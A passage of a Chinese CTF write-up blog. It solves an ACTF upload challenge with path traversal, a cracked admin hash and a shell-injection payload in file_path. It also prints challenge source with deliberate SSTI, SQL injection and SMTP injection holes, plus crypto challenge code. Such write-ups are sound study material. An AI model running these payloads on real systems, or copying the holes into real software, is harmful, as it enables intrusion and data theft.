sig)</code>返回<strong>True</strong>，只需要让它<strong>不抛出错误</strong>即可，所以这题可以<strong>直接改用户名</strong>为<code>admin</code>，它只是会签名认证不通过，但<code>valid = True</code>，从而用户认证通过</p><p>代码审的不够认真啊</p><h2 id="actf-upload"><a class="markdownIt-Anchor" href="#actf-upload"></a> ACTF upload</h2><p>图片的内容就是文件<code>base64</code>编码之后的输出</p><p>可以看到是<code>Python</code>的服务，直接尝试读取<code>/upload?file_path=../../../app/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这里给了<code>admin</code>密码的<strong>哈希值</strong>，爆破一手，我用的<code>passwd-EN-Top10000</code>，得到密码为<code>backdoor</code></p><p>然后关注最后的条件判断，可以看到有<strong>命令执行</strong>，<code>file_path</code>我们是可控的，这里只有<strong>admin</strong>可以<strong>命令执行</strong>但不能读文件，而普通用户是可以<strong>直接读文件</strong>的</p><p>所以思路就是<strong>admin</strong>传参命令执行<strong>重定向</strong>，然后普通用户读</p><p><strong>admin: /upload?file_path=;cat /Fl4g_is_H3r3 &gt; ./uploads/flag;#</strong><br /><strong>普通用户：/upload?file_path=flag</strong></p><h2 id="excellent-site"><a class="markdownIt-Anchor" href="#excellent-site"></a> Excellent-Site*</h2><blockquote><p>My site is PERFECT!!!<br />hosts: 0.0.0.0 <a href="http://ezmail.org">ezmail.org</a></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib </span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;ezmail.org&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;ezmail.org&quot;</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>注意到<code>/admin</code>路由下是可以打<code>SSTI</code>的</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="easy_log"><a class="markdownIt-Anchor" href="#easy_log"></a> easy_log*</h2><blockquote><p>E@sy L0g</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> alarm</span><br><span class="line"></span><br><span class="line">Point = namedtuple(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;x y&quot;</span>)</span><br><span class="line">O = <span class="string">&quot;Origin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_addition</span>(<span class="params">P, Q, n</span>):</span><br><span class="line"><span class="keyword">if</span> P == O:</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"><span class="keyword">if</span> Q == O:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x = (P.x * Q.y + P.y * Q.x - P.x * Q.x) % n</span><br><span class="line">y = (P.x * Q.x + P.y * Q.y) % n</span><br><span class="line"><span class="keyword">return</span> Point(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_and_add</span>(<span class="params">k, P, n</span>):</span><br><span class="line">Q = P</span><br><span class="line">R = O</span><br><span class="line"><span class="keyword">while</span>(k &gt; <span class="number">0</span>):</span><br><span class="line"><span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">R = point_addition(R, Q, n)</span><br><span class="line">k &gt;&gt;= <span class="number">1</span></span><br><span class="line">Q = point_addition(Q, Q, n)</span><br><span class="line"><span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">50</span></span><br><span class="line">flag = urandom(randint(<span class="number">38</span>, <span class="number">48</span>)) + flag</span><br><span class="line">flag = flag + urandom(<span class="number">118</span> - <span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag1, flag2 = bytes_to_long(flag[:<span class="number">68</span>]), bytes_to_long(flag[<span class="number">68</span>:])</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x231d5fa471913e79facfd95e9b874e2d499def420e0914fab5c9f87e71c2418d1194066bd8376aa8f02ef35c1926f73a46477cd4a88beae89ba575bb3e1b04271426c6706356dd8cd9aa742d7ad0343f8939bfd2110d45122929d29dc022da26551e1ed7000</span></span><br><span class="line">G1 = Point(<span class="number">0xf22b9343408c5857048a19150c8fb9fd44c25d7f6decabc10bf46a2250a128f0df15adc7b82c70c0acaf855c0e898b141c9c94ba8aef8b67ea298c6d9fd870ea70e1c4f8a1b595d15373dc6db25a4ecddf626a64f47beba5538b7f733e4aa0c4f1fd4c291d</span>, <span class="number">0x8d3264514b7fdbce97fbaedb33120c7889a1af59691a1947c2c7061347c091b0950ca36efaa704514004a988b9b87b24f5cebf2d1c7bef44ff172519e1a62eb62cde234c94bd0ab39375d7ddb42e044090c8db46d3f965ef7e4753bc41dac3b8b3ae0cdb57</span>)</span><br><span class="line">G2 = Point(<span class="number">0x81919777837d3e5065c6f7f6801fe29544180be9db2137f075f53ebb3307f917183c6fc9cdfc5d75977f7</span>, <span class="number">0xd1a586d6848caa3a5436a86d903516d83808ce2fa49c5fb3f183ecb855e961c7e816a7ba8f588ef947f19</span>)</span><br><span class="line"></span><br><span class="line">f1 = double_and_add(flag1, G1, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag1 != <span class="built_in">int</span>(<span class="built_in">input</span>()):</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> p.bit_length() == <span class="number">400</span></span><br><span class="line"></span><br><span class="line">f2 = double_and_add(flag2, G2, p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f2)</span><br></pre></td></tr></table></figure><h2 id="aaalll"><a class="markdownIt-Anchor" href="#aaalll"></a> AAALLL*</h2><blockquote><p>Let’s welcome AAA’s LLL master!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice, sample</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_ternery_poly</span>(<span class="params">Q</span>):</span><br><span class="line">    <span class="keyword">return</span> Q([choice([-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(Q.degree())])</span><br><span class="line"></span><br><span class="line">n = <span class="number">450</span></span><br><span class="line">p = <span class="number">3774877201</span></span><br><span class="line">t = n//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">g = x^n+<span class="number">1</span></span><br><span class="line">roots = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> g.roots()]</span><br><span class="line"></span><br><span class="line">subset = sample(roots, t)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = P.quotient(x^n+<span class="number">1</span>)</span><br><span class="line">f = sample_ternery_poly(Q)</span><br><span class="line">f_lift = f.lift()</span><br><span class="line">values = [f_lift(i) <span class="keyword">for</span> i <span class="keyword">in</span> subset]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;subset: <span class="subst">&#123;subset&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;values: <span class="subst">&#123;values&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(f.<span class="built_in">list</span>()).encode()).digest()</span><br><span class="line">aes = AES.new(key = key, mode = AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ct: <span class="subst">&#123;aes.encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">subset: [1040018022, 3719840057, 2086762603, 3065369513, 3179320758, 891114580, 966265556, 664146925, 1232096603, 1449704729, 2810118429, 2891821810, 698162894, 3070228878, 3114653287, 2793650430, 2941920517, 1811454265, 325024118, 1860481904, 555392385, 2818572232, 3719972491, 981226771, 1777524396, 2717373523, 3694549306, 91210020, 1397236365, 2806262125, 1966653548, 1369610707, 3545263790, 595556443, 1601356313, 2865921937, 2795518764, 1690002428, 3501122295, 2078440315, 1222414863, 1997352805, 271758023, 3348936352, 1800648013, 410072905, 3378691273, 185134810, 1281817316, 821730517, 2855781188, 3353349707, 273754906, 1187616168, 569728457, 401428606, 3671298095, 149603298, 2300569286, 1057503678, 1915386614, 2716934671, 2005635066, 389589525, 2691165686, 586877133, 2874838, 660954102, 3258633701, 1083711515, 1785913794, 3410290851, 1914395297, 2544074509, 3076714307, 2169463229, 2654223166, 3648299978, 3188000068, 1130206965, 875184747, 2549126013, 3602874619, 80327895, 983400559, 2423201604, 3384400899, 654136379, 1835112234, 3302809337, 3388376496, 364586350, 3219484816, 52162306, 3488542302, 2843511894, 638341256, 427235375, 757491483, 3364804296, 172002582, 3112473265, 2746078509, 2118542465, 421527494, 3017385718, 3683667181, 3536621837, 3113923099, 1989065494, 1769242135, 1541932517, 1963422936, 2341204092, 3306256995, 186750428, 1381468653, 1288011784, 229613411, 839241230, 425544589, 2345390466, 2552462338, 286334899, 2984993503, 3741109364, 103579106, 138703348, 2369990075, 2377640836, 1279106009, 2542780598, 1653097443, 3373448595, 2405266494, 3385287676, 289622793, 2376573706, 3096235437, 1971476669, 3449853083, 3565565810, 762810383, 272826480, 516243500, 1710511548, 3233762177, 2013126070, 224313638, 1884110819, 3141861971, 2014729696, 1572103482, 2232944684, 2644670236, 1350302342, 3589742391, 2106163918, 1077036824, 3527373372, 2474464298, 971863088, 1219963894, 3349332612, 1474307915, 905651245, 2666266327, 2192845472, 2748042118, 1489782942, 1300412903, 126577223, 545427793, 360417066, 704648323, 3562938536, 908955264, 1108610874, 247503829, 2379959160, 1059927520, 2869225956, 2202773719, 1498564318, 2032958616, 3485254408, 1091224495, 3287849020, 780873181, 3410363615, 1398303495, 2426564739, 487028181, 1230802692, 139226346, 789883698, 2557862280, 2994004020, 3205148744, 2914199937, 1803400532, 2738281702, 883055391, 1761751131, 1220550272, 1947825121, 3543565567, 1939764967, 2986882625, 798323428, 1120654035, 3722714895, 3679983602, 364513586, 1760147505, 472067864, 2393408548, 2239781327, 799334306, 3497260623, 2769084221, 860677264, 990410164, 3772002363, 2883762621]</span></span><br><span class="line"><span class="string">values: [712538976, 1225537965, 2633482204, 1245652635, 2529155164, 1672980719, 3024410928, 1535384351, 2252244320, 672919726, 2976916118, 3089453551, 2512277279, 2431400831, 1129198075, 3441247454, 610984549, 2043949242, 3306515233, 2759625250, 2459507335, 2885552592, 3226187015, 983312810, 1815610133, 871259259, 3651562935, 570267317, 2548725905, 70380481, 685470168, 1925389996, 2466124957, 1512923993, 2603725653, 409457162, 859041441, 3193931087, 786021320, 2481319115, 2379423262, 1972220678, 251474531, 448830331, 3189297419, 845468707, 3014186402, 1476144624, 1412175603, 464556671, 1251535251, 2252149066, 3501165225, 1173484383, 1168113959, 2547845342, 3132683037, 182880838, 3236782773, 637440805, 1077834200, 910992912, 1281164705, 763525563, 1025793488, 3031918542, 2457090411, 159146268, 3252417067, 1695150089, 1863899429, 2660689081, 647461624, 3736679821, 2034134877, 973654854, 1545264273, 692989149, 769387639, 2024000598, 2916906076, 1996631367, 2889527392, 527082343, 3319918691, 3629378248, 685639382, 2659312228, 472574946, 1237496521, 434512296, 3649895972, 3500730074, 1092276151, 1513927060, 1179642291, 474879861, 1132457849, 3072787035, 1536862618, 3131879287, 1635514910, 2467715064, 2377496874, 2888951190, 3697148067, 1885811970, 1037114846, 2862197847, 2248493059, 829223452, 17390497, 1063920331, 2504310664, 2269937803, 667770896, 1855657371, 323906741, 2972650844, 3620395133, 2613325861, 2508686438, 2143229100, 977352912, 3380653143, 2367018411, 1665354812, 2473914413, 3531805346, 2023595772, 1909192693, 844059686, 2233570033, 1997039839, 3558799006, 2872633369, 1949018254, 3159312415, 3021409934, 2505867881, 2357897866, 3436059930, 1496867815, 594001374, 3433203342, 2396280741, 2696363547, 1775021594, 434891096, 862244228, 1372573410, 3003385341, 3051290794, 493688483, 2143128679, 394087901, 3668481745, 1085467544, 2438896216, 1782052147, 2415529482, 149721114, 1539904401, 1902915995, 1929333694, 1759980967, 2106193398, 3670877657, 2736025727, 3133082490, 182590224, 1099952929, 3522052498, 2206338880, 1925988633, 3440533747, 25471854, 325651518, 72348028, 3178620735, 3335468600, 818634602, 2932340363, 1163855672, 2453716531, 373827915, 2373018915, 2231504345, 2975884007, 3636085022, 2354093635, 2696203979, 799834661, 2412088324, 1446875965, 3299868618, 302142905, 1957341475, 1522953201, 1257060525, 3769499753, 1591149900, 295691418, 3249943297, 1280379656, 1164820140, 115871117, 219831260, 2505969457, 2618672354, 2781617927, 2886486193, 1648555579, 1265576372, 1720183485, 2424145699, 2772052592, 2399827477, 626825210, 2422432913, 322266950, 2157976175, 2208875362, 2216568965, 3223085486]</span></span><br><span class="line"><span class="string">ct: 